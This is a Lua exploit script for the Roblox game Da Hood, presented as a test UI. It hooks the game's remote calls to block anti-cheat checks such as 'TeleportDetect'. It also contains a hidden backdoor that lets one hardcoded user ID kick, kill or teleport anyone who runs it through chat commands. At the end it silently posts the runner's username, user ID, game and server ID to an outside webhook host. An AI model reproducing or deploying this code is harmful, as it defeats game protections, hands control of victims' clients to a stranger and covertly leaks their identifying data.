
-- one time executed
if Executed then
	return
end

getgenv().Executed = true

-- da hood by pass
local Hook

Hook = hookmetamethod(game,"__namecall", newcclosure(function(self, ...)
   local args = {...}
   if getnamecallmethod() == "FireServer" or "InvokeServer" and self.Name == "OneMoreTime" or "TeleportDetect" or "CHECKER_1" then
       return
   end
   return Hook(self, ...)
end))

local AdminPrefix = "!" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
local PlayerGui = LocalP:WaitForChild("PlayerGui")

local Vu = Instance.new("ScreenGui")
local vil = Instance.new("Frame")
local user = Instance.new("TextLabel")
local imageuser = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local smeweirdtext = Instance.new("TextLabel")

getgenv().AdminTable = {
	["692194040"] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
}

getgenv().psearch = function(Name)
	local Inserted = {}
	for _, p in pairs(Players:GetPlayers()) do
		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
			table.insert(Inserted, p);return p
		end
	end
end -- Simple player finder function

getgenv().AdminCmdList = {
	["kick"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP:Kick(self)
			end
		end;
		["Clearence"] = {[5] = true;};
	}; -- you can make new ones of these (the ; have to be in the same spots)
	["kill"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				LocalP.Character.Humanoid:ChangeState(15)
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
	["bring"] = {
		["CommandFunc"] = function(Player, self, CmdPlayer)
			if Player == LocalP or Player == "all" then
				local root = LocalP.Character:FindFirstChild("HumanoidRootPart") or LocalP.Character:FindFirstChild("Torso")
				if root then
					LocalP.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				end
			end
		end;
		["Clearence"] = {[4] = true;[5] = true;};
	};
};

getgenv().BDCheck = function(Target2, Chat)
	if Chat:sub(1, 1) == AdminPrefix then
		local args = string.split(Chat:sub(2), " ")
		local Command = AdminCmdList[table.remove(args, 1)]
		local targ1 = psearch(table.remove(args, 1))
		if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
		end
	end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
	local CoolKidPlayer = GP[i]
	CoolKidPlayer.Chatted:Connect(function(Word)
		BDCheck(CoolKidPlayer, Word)
	end)
end 
-- Checks if you chatted a command
Players.PlayerAdded:Connect(function(CKP)
	CKP.Chatted:Connect(function(Message)
		BDCheck(CKP, Message)
	end)
end)

--Properties:

Vu.Name = "Vu"
Vu.Parent = PlayerGui
Vu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

vil.Name = "vil"
vil.Parent = Vu
vil.AnchorPoint = Vector2.new(0.5, 0.5)
vil.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
vil.BorderColor3 = Color3.fromRGB(27, 42, 53)
vil.BorderSizePixel = 0
vil.Position = UDim2.new(0.321526051, 0, 0.49862501, 0)
vil.Size = UDim2.new(0, 361, 0, 412)
vil.Draggable = true
vil.Active = true

user.Name = "user"
user.Parent = vil
user.AnchorPoint = Vector2.new(0.5, 0.5)
user.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
user.BackgroundTransparency = 1.000
user.Position = UDim2.new(0.5, 0, 0.409658641, 0)
user.Size = UDim2.new(0, 230, 0, 24)
user.Font = Enum.Font.Gotham
user.Text = LocalP.Name
user.TextColor3 = Color3.fromRGB(255, 255, 255)
user.TextScaled = true
user.TextSize = 14.000
user.TextWrapped = true

imageuser.Name = "imageuser"
imageuser.Parent = vil
imageuser.AnchorPoint = Vector2.new(0.5, 0.5)
imageuser.BackgroundColor3 = Color3.fromRGB(238, 115, 117)
imageuser.BackgroundTransparency = 1.000
imageuser.Position = UDim2.new(0.5, 0, 0.224999994, 0)
imageuser.Size = UDim2.new(0, 100, 0, 100)

UICorner.Parent = imageuser

smeweirdtext.Name = "smeweirdtext"
smeweirdtext.Parent = vil
smeweirdtext.AnchorPoint = Vector2.new(0.5, 0.5)
smeweirdtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
smeweirdtext.BackgroundTransparency = 1.000
smeweirdtext.Position = UDim2.new(0.5, 0, 0.5, 0)
smeweirdtext.Size = UDim2.new(0, 281, 0, 49)
smeweirdtext.Font = Enum.Font.Gotham
smeweirdtext.Text = "Esto es un UI de prueba"
smeweirdtext.TextColor3 = Color3.fromRGB(255, 255, 255)
smeweirdtext.TextScaled = true
smeweirdtext.TextSize = 14.000
smeweirdtext.TextWrapped = true
smeweirdtext.TextXAlignment = Enum.TextXAlignment.Left


					local function HMJCESE_fake_script()
						local Players = game:GetService("Players")

						local thumbType = Enum.ThumbnailType.HeadShot
						local thumbSize = Enum.ThumbnailSize.Size180x180
						local content, isReady = Players:GetUserThumbnailAsync(LocalP.UserId, thumbType, thumbSize)


						local imageLabel = script.Parent
						imageuser.Image = content
					end
					coroutine.wrap(HMJCESE_fake_script)()

        local url =
        "https://websec.services/send/62e806ed7907ab0a63d4d550"
    

        local data = {
            ["embeds"] = {
                {
                    ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["url"] = "https://www.roblox.com/games/2788229376/Da-Hood",
                    ["type"] = "rich",
                    ["fields"] = {
                        {
                            ["name"] = '**ROBLOX Name**',
                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.Name .. "```",
                            ["inline"] = false,


                        },
                        {

                            ["name"] = '**ROBLOX User ID**',
                            ["value"] = "```" .. game:GetService("Players").LocalPlayer.UserId .. "```",
                            ["inline"] = false

                        },
                        {
                            ["name"] = '**Game Playing**',
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = false

                        },
                        {
                            ["name"] = '**Server ID**',
                            ["value"] = "```" .. game.JobId .. "```",
                            ["inline"] = false

                        }
                    }

                } }
        }

        local newdata = game:GetService("HttpService"):JSONEncode(data)

        local headers = {
            ["content-type"] = "application/json"
        }
        request = http_request or request or HttpPost or syn.request
        local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
        request(abcdef)
